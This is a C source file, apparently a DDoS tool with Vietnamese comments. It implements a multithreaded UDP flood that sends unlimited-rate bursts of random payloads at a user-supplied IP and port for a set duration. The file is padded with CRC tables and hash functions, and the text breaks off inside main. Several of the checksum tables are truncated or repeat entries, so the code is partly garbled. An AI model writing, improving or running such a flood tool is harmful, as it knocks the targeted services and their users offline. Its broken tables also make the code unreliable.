#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>
#include <stdint.h>
#include <stdbool.h>

#define DEFAULT_PACKET_SIZE 1024
#define MAX_PACKET_SIZE 65507  // Maximum UDP packet size
#define MIN_PACKET_SIZE 32     // Minimum packet size
#define BURST_SIZE 64         // Số lượng gói tin gửi trong một burst
#define SOCKET_BUFFER_SIZE 65535 // Kích thước buffer cho socket

// Function prototypes - đặt tất cả các khai báo hàm ở đây
uint8_t calculate_crc8(const void *data, size_t length);
uint16_t calculate_crc16(const void *data, size_t length);
uint32_t calculate_crc24(const void *data, size_t length);
uint32_t calculate_crc32(const void *data, size_t length);
uint64_t calculate_crc64(const void *data, size_t length);
uint32_t calculate_adler32(const void *data, size_t length);
uint16_t calculate_fletcher16(const void *data, size_t length);
uint32_t calculate_jenkins(const void *data, size_t length);
uint64_t calculate_fnv1a(const void *data, size_t length);
void mt_seed(uint32_t seed);
uint32_t mt_rand(void);
char *generate_random_data(int length);

// Cấu trúc tham số cho flood attack
typedef struct {
    char *ip;
    int port;
    int duration;
    int pps;
    int packet_size;
    char *custom_data;
    bool use_checksum;
    int checksum_type;
} flood_args;

// Cấu trúc mới cho thống kê
typedef struct {
    uint64_t packets_sent;
    uint64_t bytes_sent;
    uint64_t failed_sends;
    double start_time;
    pthread_mutex_t mutex;
} flood_stats;

// Biến toàn cục cho thống kê
static flood_stats stats = {0, 0, 0, 0, PTHREAD_MUTEX_INITIALIZER};

// Bảng CRC32
static const uint32_t crc32_table[256] = {
    0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f,
    0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,
    0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2,
    0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,
    0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9,
    0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,
    0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b, 0x35b5a8fa, 0x42b2986c,
    0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,
    0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423,
    0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,
    0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190, 0x01db7106,
    0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,
    0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d,
    0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,
    0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950,
    0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,
    0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7,
    0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,
    0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa,
    0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
    0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81,
    0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,
    0xeead4739, 0x9ddb77af, 0x04d22615, 0x73d51683, 0xe36a0b12, 0x946d3b84,
    0x0d646a3e, 0x7a635aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,
    0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb,
    0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,
    0xf9b9df6f, 0x8ebecff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e,
    0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,
    0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55,
    0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,
    0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28,
    0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,
    0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f,
    0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,
    0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242,
    0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,
    0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69,
    0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,
    0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc,
    0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
    0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693,
    0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,
    0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d
};

// Bảng CRC16
static const uint16_t crc16_table[256] = {
    0x0000, 0xC0C1, 0xC181, 0x0140, 0xC301, 0x03C0, 0x0280, 0xC241,
    0xC601, 0x06C0, 0x0780, 0xC741, 0x0500, 0xC5C1, 0xC481, 0x0440,
    0xCC01, 0x0CC0, 0x0D80, 0xCD41, 0x0F00, 0xCFC1, 0xCE81, 0x0E40,
    0x0A00, 0xCAC1, 0xCB81, 0x0B40, 0xC901, 0x09C0, 0x0880, 0xC841,
    0xD801, 0x18C0, 0x1980, 0xD941, 0x1B00, 0xDBC1, 0xDA81, 0x1A40,
    0x1E00, 0xDEC1, 0xDF81, 0x1F40, 0xDD01, 0x1DC0, 0x1C80, 0xDC41,
    0x1400, 0xD4C1, 0xD581, 0x1540, 0xD701, 0x17C0, 0x1680, 0xD641,
    0xD201, 0x12C0, 0x1380, 0xD341, 0x1100, 0xD1C1, 0xD081, 0x1040,
    0xF001, 0x30C0, 0x3180, 0xF141, 0x3300, 0xF3C1, 0xF281, 0x3240,
    0x3600, 0xF6C1, 0xF781, 0x3740, 0xF501, 0x35C0, 0x3480, 0xF441,
    0x3C00, 0xFCC1, 0xFD81, 0x3D40, 0xFF01, 0x3FC0, 0x3E80, 0xFE41,
    0xFA01, 0x3AC0, 0x3B80, 0xFB41, 0x3900, 0xF9C1, 0xF881, 0x3840,
    0x2800, 0xE8C1, 0xE981, 0x2940, 0xEB01, 0x2BC0, 0x2A80, 0xEA41,
    0xEE01, 0x2EC0, 0x2F80, 0xEF41, 0x2D00, 0xEDC1, 0xEC81, 0x2C40,
    0xE401, 0x24C0, 0x2580, 0xE541, 0x2700, 0xE7C1, 0xE681, 0x2640,
    0x2200, 0xE2C1, 0xE381, 0x2340, 0xE101, 0x21C0, 0x2080, 0xE041,
    0xA001, 0x60C0, 0x6180, 0xA141, 0x6300, 0xA3C1, 0xA281, 0x6240,
    0x6600, 0xA6C1, 0xA781, 0x6740, 0xA501, 0x65C0, 0x6480, 0xA441,
    0x6C00, 0xACC1, 0xAD81, 0x6D40, 0xAF01, 0x6FC0, 0x6E80, 0xAE41,
    0xAA01, 0x6AC0, 0x6B80, 0xAB41, 0x6900, 0xA9C1, 0xA881, 0x6840,
    0x7800, 0xB8C1, 0xB981, 0x7940, 0xBB01, 0x7BC0, 0x7A80, 0xBA41,
    0xBE01, 0x7EC0, 0x7F80, 0xBF41, 0x7D00, 0xBDC1, 0xBC81, 0x7C40,
    0xB401, 0x74C0, 0x7580, 0xB541, 0x7700, 0xB7C1, 0xB681, 0x7640,
    0x7200, 0xB2C1, 0xB381, 0x7340, 0xB101, 0x71C0, 0x7080, 0xB041,
    0x5000, 0x90C1, 0x9181, 0x5140, 0x9301, 0x53C0, 0x5280, 0x9241,
    0x9601, 0x56C0, 0x5780, 0x9741, 0x5500, 0x95C1, 0x9481, 0x5440,
    0x9C01, 0x5CC0, 0x5D80, 0x9D41, 0x5F00, 0x9FC1, 0x9E81, 0x5E40,
    0x5A00, 0x9AC1, 0x9B81, 0x5B40, 0x9901, 0x59C0, 0x5880, 0x9841,
    0x8801, 0x48C0, 0x4980, 0x8941, 0x4B00, 0x8BC1, 0x8A81, 0x4A40,
    0x4E00, 0x8EC1, 0x8F81, 0x4F40, 0x8D01, 0x4DC0, 0x4C80, 0x8C41,
    0x4400, 0x84C1, 0x8581, 0x4540, 0x8701, 0x47C0, 0x4680, 0x8641,
    0x8201, 0x42C0, 0x4380, 0x8341, 0x4100, 0x81C1, 0x8081, 0x4040
};

// Bảng CRC8
static const uint8_t crc8_table[256] = {
    0x00, 0x07, 0x0E, 0x09, 0x1C, 0x1B, 0x12, 0x15,
    0x38, 0x3F, 0x36, 0x31, 0x24, 0x23, 0x2A, 0x2D,
    0x70, 0x77, 0x7E, 0x79, 0x6C, 0x6B, 0x62, 0x65,
    0x4C, 0x4B, 0x42, 0x45, 0x50, 0x57, 0x5E, 0x59,
    0xE0, 0xE7, 0xEE, 0xE9, 0xFC, 0xFB, 0xF2, 0xF5,
    0xD8, 0xDF, 0xD6, 0xD1, 0xC4, 0xC3, 0xCA, 0xCD,
    0xA0, 0xA7, 0xAE, 0xA9, 0xBC, 0xBB, 0xB2, 0xB5,
    0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85,
    0x3A, 0x3D, 0x34, 0x33, 0x26, 0x21, 0x28, 0x2F,
    0x0C, 0x0B, 0x02, 0x05, 0x1E, 0x19, 0x10, 0x17,
    0x7A, 0x7D, 0x74, 0x73, 0x66, 0x61, 0x68, 0x6F,
    0x4A, 0x4D, 0x44, 0x43, 0x56, 0x51, 0x58, 0x5F,
    0xF0, 0xF7, 0xFE, 0xF9, 0xEC, 0xEB, 0xE2, 0xE5,
    0xC8, 0xCF, 0xC6, 0xC1, 0xD4, 0xD3, 0xDA, 0xDD,
    0xA0, 0xA7, 0xAE, 0xA9, 0xBC, 0xBB, 0xB2, 0xB5,
    0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85,
    0x27, 0x20, 0x29, 0x2E, 0x3B, 0x3C, 0x35, 0x32,
    0x0F, 0x08, 0x01, 0x06, 0x13, 0x14, 0x1D, 0x1A,
    0x75, 0x72, 0x7B, 0x7C, 0x69, 0x6E, 0x67, 0x60,
    0x4D, 0x4A, 0x43, 0x44, 0x51, 0x56, 0x5F, 0x58
};

// Bảng CRC24
static const uint32_t crc24_table[256] = {
    0x000000, 0x864CFB, 0x8AD50D, 0x0C99F6, 0x93E6E1, 0x15AA1A, 0x1933EC, 0x9F7F17,
    0xA18139, 0x27CDC2, 0x2B5434, 0xAD18CF, 0x3267D8, 0xB42B23, 0xB8B2D5, 0x3EFE2E,
    0xC54E89, 0x430272, 0x4F9B84, 0xC9D77F, 0x56A868, 0xD0E493, 0xDC7D65, 0x5A319E,
    0x64CFB0, 0xE2834B, 0xEE1ABD, 0x685646, 0xF72951, 0x7165AA, 0x7DFC5C, 0xFBB0A7,
    0x0CD1E9, 0x8A9D12, 0x8604E4, 0x00481F, 0x9F3708, 0x197BF3, 0x15E205, 0x93AEFE,
    0xBDB0D0, 0x3BFC2B, 0x3765DD, 0xB12926, 0x2E5631, 0xA81ACA, 0xA4833C, 0x22CFC7,
    0xD99F60, 0x5FD39B, 0x534A6D, 0xD50696, 0x4A7981, 0xCC357A, 0xC0AC8C, 0x46E077,
    0x781E59, 0xFE52A2, 0xF2CB54, 0x7487AF, 0xEB18B8, 0x6D5443, 0x61CDB5, 0xE7814E,
    0x19A3D2, 0x9FEF29, 0x9376DF, 0x153A24, 0x8A4533, 0x0C09C8, 0x00903E, 0x86DCC5,
    0xB822EB, 0x3E6E10, 0x32F7E6, 0xB4BB1D, 0x2BC40A, 0xAD88F1, 0xA11107, 0x275DFC,
    0xDCED5B, 0x5AA1A0, 0x563856, 0xD074AD, 0x4F0BBA, 0xC94741, 0xC5DEB7, 0x43924C,
    0x7D6C62, 0xFBA099, 0xF7396F, 0x71F594, 0xEE8A83, 0x68C678, 0x645F8E, 0xE21375,
    0x15723B, 0x933EC0, 0x9FA736, 0x19EBCD, 0x8694DA, 0x00D821, 0x0C41D7, 0x8A0D2C,
    0xB4F302, 0x32BFF9, 0x3E260F, 0xB86AF4, 0x2715E3, 0xA15918, 0xAD80EE, 0x2BCC15,
    0xD03CB2, 0x567049, 0x5AE9BF, 0xDC2544, 0x435A53, 0xC516A8, 0xC98F5E, 0x4FC3A5,
    0x713D8B, 0xF77170, 0xFBE886, 0x7DA47D, 0xE2DB6A, 0x649791, 0x680E67, 0xE2429C
};

// Bảng CRC64
static const uint64_t crc64_table[256] = {
    0x0000000000000000ULL, 0x42F0E1EBA9EA3693ULL, 0x85E1C3D753D46D26ULL, 0xC711223CFA3E5BB5ULL,
    0x493366450E42ECDFULL, 0x0BC387AEA7A8DA4CULL, 0xCCD2A5925D9681F9ULL, 0x8E224479F47CB76AULL,
    0x9266CC8A1C85D9BEULL, 0xD0962D61B56FEF2DULL, 0x17870F5D4F51B498ULL, 0x5577EEB6E6BB820BULL,
    0xDB55AACF12C73561ULL, 0x99A54B24BB2D03F2ULL, 0x5EB4691841135847ULL, 0x1C4488F3E8F96ED4ULL,
    0x663D78FF90E185EFULL, 0x24CD9914390BB37CULL, 0xE3DCBB28C335E8C9ULL, 0xA12C5AC36ADFDE5AULL,
    0x2F0E1EBA9EA36930ULL, 0x6DFEFF5137495FA3ULL, 0xAAEFDD6DCD770416ULL, 0xE81F3C86649D3285ULL,
    0xF45BB4758C645C51ULL, 0xB6AB559E258E6AC2ULL, 0x71BA77A2DFB03177ULL, 0x334A9649765A07E4ULL,
    0x0DB4B8279026B08EULL, 0x4F4459CC39CC861DULL, 0x88557BF0C3F2DDA8ULL, 0xCAA59A1B6A18EB3BULL,
    0x4487DE629E645C51ULL, 0x06773F89378E6AC2ULL, 0xC1661DB5CDA03177ULL, 0x8396FC5E644A07E4ULL,
    0xBD68D2308236B08EULL, 0xFF9833DB2BDC861DULL, 0x388911E7D1E2DDA8ULL, 0x7A79F00C7808EB3BULL,
    0xE506E79B00F402DEULL, 0xA7F60670A91E344DULL, 0x60E7244C53206FF8ULL, 0x2217C5A7FAEA596BULL,
    0xAC3581DE0ED6EE01ULL, 0xEEC56035A73CD892ULL, 0x29D442095D028327ULL, 0x6B24A3E2F4E8B5B4ULL,
    0x55DA8D8C129402DEULL, 0x172A6C67BB7E344DULL, 0xD03B4E5B41406FF8ULL, 0x92CB8FB0E8AA596BULL,
    0x1C89CB091CD6EE01ULL, 0x5E792AE2B53CD892ULL, 0x996808DE4F028327ULL, 0xDB98E935E6E8B5B4ULL,
    0x25BA655B009402DEULL, 0x674A84B0A97E344DULL, 0xA05BA68C53406FF8ULL, 0xE2A84767FAEA596BULL,
    0x7DD750F08216B02AULL, 0x3F27B11B2BFC86B9ULL, 0xF8369327D1C2DD0CULL, 0xBAE672CC7828EB9FULL,
    0x34C436B58C545CF5ULL, 0x7634D75E25BE6A66ULL, 0xB125F562DF8031D3ULL, 0xF3D51489766A0740ULL,
    0xED2B3AE79016B02AULL, 0xAFEBD90C39FCA6B9ULL, 0x68FBFB30C3C2FD0CULL, 0x2A0B1ADB6A28CB9FULL,
    0xA4295E829E547CF5ULL, 0xE6D9BF6937BE4A66ULL, 0x21C89D55CD8011D3ULL, 0x63387CBF646A2740ULL
};

// Thêm các thuật toán checksum mới
#define ADLER32_MOD 65521 // Số nguyên tố lớn nhất nhỏ hơn 2^16

// Hàm tính Adler-32 checksum
uint32_t calculate_adler32(const void *data, size_t length) {
    const uint8_t *bytes = (const uint8_t *)data;
    uint32_t a = 1, b = 0;

    for (size_t i = 0; i < length; i++) {
        a = (a + bytes[i]) % ADLER32_MOD;
        b = (b + a) % ADLER32_MOD;
    }

    return (b << 16) | a;
}

// Hàm tính Fletcher-16 checksum
uint16_t calculate_fletcher16(const void *data, size_t length) {
    const uint8_t *bytes = (const uint8_t *)data;
    uint16_t sum1 = 0, sum2 = 0;

    for (size_t i = 0; i < length; i++) {
        sum1 = (sum1 + bytes[i]) % 255;
        sum2 = (sum2 + sum1) % 255;
    }

    return (sum2 << 8) | sum1;
}

// Hàm tính Jenkins One-at-a-time hash
uint32_t calculate_jenkins(const void *data, size_t length) {
    const uint8_t *bytes = (const uint8_t *)data;
    uint32_t hash = 0;

    for (size_t i = 0; i < length; i++) {
        hash += bytes[i];
        hash += (hash << 10);
        hash ^= (hash >> 6);
    }

    hash += (hash << 3);
    hash ^= (hash >> 11);
    hash += (hash << 15);

    return hash;
}

// Hàm tính FNV-1a hash
uint64_t calculate_fnv1a(const void *data, size_t length) {
    const uint8_t *bytes = (const uint8_t *)data;
    uint64_t hash = 0xcbf29ce484222325ULL; // FNV offset basis
    const uint64_t prime = 0x100000001b3ULL; // FNV prime

    for (size_t i = 0; i < length; i++) {
        hash ^= bytes[i];
        hash *= prime;
    }

    return hash;
}

// Nâng cấp hàm calculate_checksum với nhiều thuật toán hơn
uint64_t calculate_checksum(const void *data, size_t length, int checksum_type) {
    switch (checksum_type) {
        case 0: // CRC32
            return calculate_crc32(data, length);
        case 1: // CRC16
            return calculate_crc16(data, length);
        case 2: // CRC8
            return calculate_crc8(data, length);
        case 3: // CRC24
            return calculate_crc24(data, length);
        case 4: // CRC64
            return calculate_crc64(data, length);
        case 5: // Adler32
            return calculate_adler32(data, length);
        case 6: // Fletcher16
            return calculate_fletcher16(data, length);
        case 7: // Jenkins
            return calculate_jenkins(data, length);
        case 8: // FNV-1a
            return calculate_fnv1a(data, length);
        default:
            return 0;
    }
}

// Cải tiến hệ thống tạo số ngẫu nhiên với Mersenne Twister
#define MT_N 624
#define MT_M 397
#define MT_MATRIX_A 0x9908b0dfUL
#define MT_UPPER_MASK 0x80000000UL
#define MT_LOWER_MASK 0x7fffffffUL

static uint32_t mt[MT_N];
static int mti = MT_N + 1;

// Khởi tạo Mersenne Twister với seed
void mt_seed(uint32_t seed) {
    mt[0] = seed;
    for (mti = 1; mti < MT_N; mti++) {
        mt[mti] = (1812433253UL * (mt[mti-1] ^ (mt[mti-1] >> 30))) + mti;
    }
}

// Tạo số ngẫu nhiên với Mersenne Twister
uint32_t mt_rand(void) {
    uint32_t y;
    static const uint32_t mag01[2] = {0x0UL, MT_MATRIX_A};

    if (mti >= MT_N) {
        int kk;

        if (mti == MT_N + 1) {
            mt_seed(5489UL);
        }

        for (kk = 0; kk < MT_N - MT_M; kk++) {
            y = (mt[kk] & MT_UPPER_MASK) | (mt[kk+1] & MT_LOWER_MASK);
            mt[kk] = mt[kk+MT_M] ^ (y >> 1) ^ mag01[y & 0x1UL];
        }
        for (; kk < MT_N-1; kk++) {
            y = (mt[kk] & MT_UPPER_MASK) | (mt[kk+1] & MT_LOWER_MASK);
            mt[kk] = mt[kk+(MT_M-MT_N)] ^ (y >> 1) ^ mag01[y & 0x1UL];
        }
        y = (mt[MT_N-1] & MT_UPPER_MASK) | (mt[0] & MT_LOWER_MASK);
        mt[MT_N-1] = mt[MT_M-1] ^ (y >> 1) ^ mag01[y & 0x1UL];

        mti = 0;
    }

    y = mt[mti++];

    y ^= (y >> 11);
    y ^= (y << 7) & 0x9d2c5680UL;
    y ^= (y << 15) & 0xefc60000UL;
    y ^= (y >> 18);

    return y;
}

// Cải tiến hàm tạo chuỗi ngẫu nhiên
char *generate_random_data(int length) {
    // Mở rộng bộ ký tự với các ký tự đặc biệt và Unicode
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
                          "!@#$%^&*()_+-=[]{}|;:,.<>?`~"
                          "αβγδεζηθικλμνξοπρστυφχψω"
                          "ΑΒΓΔΕΖΗΘΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩ";
    const int charset_size = sizeof(charset) - 1;

    char *random_data = malloc(length + 1);
    if (!random_data) {
        perror("Failed to allocate memory for random data");
        return NULL;
    }

    // Sử dụng entropy từ nhiều nguồn
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    mt_seed((uint32_t)(ts.tv_nsec ^ ts.tv_sec));

    // Tạo dữ liệu ngẫu nhiên với độ phức tạp cao
    for (int i = 0; i < length; i++) {
        uint32_t rand_val = mt_rand();
        // Thêm entropy bổ sung
        rand_val ^= (uint32_t)ts.tv_nsec;
        rand_val ^= (uint32_t)clock();
        
        // Áp dụng một số phép biến đổi
        rand_val = ((rand_val * 1103515245 + 12345) >> 16) & 0x7fff;
        random_data[i] = charset[rand_val % charset_size];
    }
    random_data[length] = '\0';

    return random_data;
}

// Hàm tính CRC8
uint8_t calculate_crc8(const void *data, size_t length) {
    const uint8_t *bytes = (const uint8_t *)data;
    uint8_t crc = 0;

    for (size_t i = 0; i < length; i++) {
        crc = crc8_table[crc ^ bytes[i]];
    }

    return crc;
}

// Hàm tính CRC24
uint32_t calculate_crc24(const void *data, size_t length) {
    const uint8_t *bytes = (const uint8_t *)data;
    uint32_t crc = 0x00FFFFFF; // Bắt đầu từ 0xFFFFFF

    for (size_t i = 0; i < length; i++) {
        uint8_t table_index = (crc ^ bytes[i]) & 0xFF;
        crc = (crc >> 8) ^ crc24_table[table_index];
    }

    return crc;
}

// Hàm tính CRC64
uint64_t calculate_crc64(const void *data, size_t length) {
    const uint8_t *bytes = (const uint8_t *)data;
    uint64_t crc = 0xFFFFFFFFFFFFFFFF; // Bắt đầu từ 0xFFFFFFFFFFFFFFFF

    for (size_t i = 0; i < length; i++) {
        uint8_t table_index = (crc ^ bytes[i]) & 0xFF;
        crc = (crc >> 8) ^ crc64_table[table_index];
    }

    return crc;
}

// Hàm tính CRC32
uint32_t calculate_crc32(const void *data, size_t length) {
    const uint8_t *bytes = (const uint8_t *)data;
    uint32_t crc = 0xffffffff;

    for (size_t i = 0; i < length; i++) {
        uint8_t table_index = (crc ^ bytes[i]) & 0xff;
        crc = (crc >> 8) ^ crc32_table[table_index];
    }

    return crc ^ 0xffffffff;
}

// Hàm tính CRC16
uint16_t calculate_crc16(const void *data, size_t length) {
    const uint8_t *bytes = (const uint8_t *)data;
    uint16_t crc = 0xffff;

    for (size_t i = 0; i < length; i++) {
        uint8_t table_index = (crc ^ bytes[i]) & 0xff;
        crc = (crc >> 8) ^ crc16_table[table_index];
    }

    return crc;
}

// Hàm tính thời gian hiện tại theo microseconds
double get_current_time() {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + (ts.tv_nsec / 1.0e9);
}

// Hàm cập nhật thống kê an toàn với thread
void update_stats(uint64_t packets, uint64_t bytes, uint64_t fails) {
    pthread_mutex_lock(&stats.mutex);
    stats.packets_sent += packets;
    stats.bytes_sent += bytes;
    stats.failed_sends += fails;
    pthread_mutex_unlock(&stats.mutex);
}

// Hàm khởi tạo socket với các tối ưu
int initialize_socket() {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        return -1;
    }

    // Tối ưu hóa socket
    int opt_val = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt_val, sizeof(opt_val));
    
    // Tăng kích thước buffer
    int buffer_size = SOCKET_BUFFER_SIZE;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    
    // Disable fragmentation
    #ifdef IP_MTU_DISCOVER
    int mtu_discover = IP_PMTUDISC_DO;
    setsockopt(sock, IPPROTO_IP, IP_MTU_DISCOVER, &mtu_discover, sizeof(mtu_discover));
    #endif

    return sock;
}

// Hàm tạo payload ngẫu nhiên với nhiều mẫu khác nhau
char *create_payload(int size, int pattern_type) {
    char *payload = malloc(size);
    if (!payload) return NULL;

    switch (pattern_type % 4) {
        case 0: // Random data
            for (int i = 0; i < size; i++) {
                payload[i] = (char)(mt_rand() & 0xFF);
            }
            break;
        case 1: // Incrementing pattern
            for (int i = 0; i < size; i++) {
                payload[i] = i & 0xFF;
            }
            break;
        case 2: // Alternating pattern
            for (int i = 0; i < size; i++) {
                payload[i] = (i % 2) ? 0xFF : 0x00;
            }
            break;
        case 3: // Custom random string
            {
                char *random_str = generate_random_data(size);
                if (random_str) {
                    memcpy(payload, random_str, size);
                    free(random_str);
                }
            }
            break;
    }
    return payload;
}

// Hàm flood UDP nâng cấp
void *udp_flood(void *args) {
    flood_args *params = (flood_args *)args;
    int sock;
    struct sockaddr_in target;
    uint64_t local_packets = 0, local_bytes = 0, local_fails = 0;
    double sleep_time = 0;

    // Khởi tạo socket với các tối ưu
    if ((sock = initialize_socket()) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Cấu hình địa chỉ đích
    target.sin_family = AF_INET;
    target.sin_port = htons(params->port);
    target.sin_addr.s_addr = inet_addr(params->ip);

    // Tính toán thời gian sleep giữa các gói tin nếu có giới hạn PPS
    if (params->pps > 0) {
        sleep_time = 1.0 / params->pps;
    }

    // Chuẩn bị nhiều payload khác nhau
    char **payloads = malloc(4 * sizeof(char*));
    for (int i = 0; i < 4; i++) {
        payloads[i] = create_payload(params->packet_size, i);
        if (!payloads[i]) {
            perror("Failed to create payload");
            for (int j = 0; j < i; j++) free(payloads[j]);
            free(payloads);
            close(sock);
            pthread_exit(NULL);
        }
    }

    double start_time = get_current_time();
    double current_time;

    while ((current_time = get_current_time()) - start_time < params->duration) {
        // Gửi burst các gói tin
        for (int i = 0; i < BURST_SIZE; i++) {
            // Chọn payload ngẫu nhiên
            char *current_payload = payloads[mt_rand() % 4];
            
            // Thêm checksum nếu được yêu cầu
            if (params->use_checksum) {
                uint64_t checksum = calculate_checksum(current_payload, 
                                                     params->packet_size - sizeof(uint64_t), 
                                                     params->checksum_type);
                memcpy(current_payload + params->packet_size - sizeof(uint64_t), 
                       &checksum, sizeof(uint64_t));
            }

            // Gửi gói tin
            ssize_t sent = sendto(sock, current_payload, params->packet_size, 0,
                                (struct sockaddr *)&target, sizeof(target));

            if (sent > 0) {
                local_packets++;
                local_bytes += sent;
            } else {
                local_fails++;
            }
        }

        // Cập nhật thống kê định kỳ
        if (local_packets % 10000 == 0) {
            update_stats(local_packets, local_bytes, local_fails);
            local_packets = local_bytes = local_fails = 0;
        }

        // Sleep nếu có giới hạn PPS
        if (sleep_time > 0) {
            usleep((useconds_t)(sleep_time * 1000000));
        }
    }

    // Cập nhật thống kê cuối cùng
    update_stats(local_packets, local_bytes, local_fails);

    // Giải phóng tài nguyên
    for (int i = 0; i < 4; i++) {
        free(payloads[i]);
    }
    free(payloads);
    close(sock);

    return NULL;
}

// Nâng cấp hàm main để hỗ trợ thống kê
int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("Usage: %s <ip> <port> <threads> <time> [packet_size]\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    int duration = atoi(argv[4]);
    int packet_size = (argc > 5) ? atoi(argv[5]) : DEFAULT_PACKET_SIZE;
    int pps = -1;  // Mặc định là -1 (không giới hạn)

    // Kiểm tra và điều chỉnh kích thước gói tin
    if (packet_size < MIN_PACKET_SIZE) packet_size = MIN_PACKET_SIZE;
    if (packet_size > MAX_PACKET_SIZE) packet_size = MAX_PACKET_SIZE;

    pthread_t *thread_pool = malloc(threads * sizeof(pthread_t));
    if (!thread_pool) {
        perror("Failed to allocate thread pool");
        return EXIT_FAILURE;
    }

    // Khởi tạo thống kê
    stats.start_time = get_current_time();

    // Cấu hình flood
    flood_args args = {
        .ip = ip,
        .port = port,
        .duration = duration,
        .pps = pps,
        .packet_size = packet_size,
        .custom_data = NULL,
        .use_checksum = true,
        .checksum_type = mt_rand() % 9  // Chọn ngẫu nhiên loại checksum
    };

    printf("Starting UDP flood attack...\n");
    printf("Target: %s:%d\n", ip, port);
    printf("Threads: %d, Duration: %d seconds\n", threads, duration);
    printf("Packet size: %d bytes, PPS: unlimited\n", packet_size);

    // Khởi tạo các thread
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_pool[i], NULL, udp_flood, &args) != 0) {
            perror("Failed to create thread");
            free(thread_pool);
            return EXIT_FAILURE;
        }
    }

    // Hiển thị thống kê theo thời gian thực
    while (get_current_time() - stats.start_time < duration) {
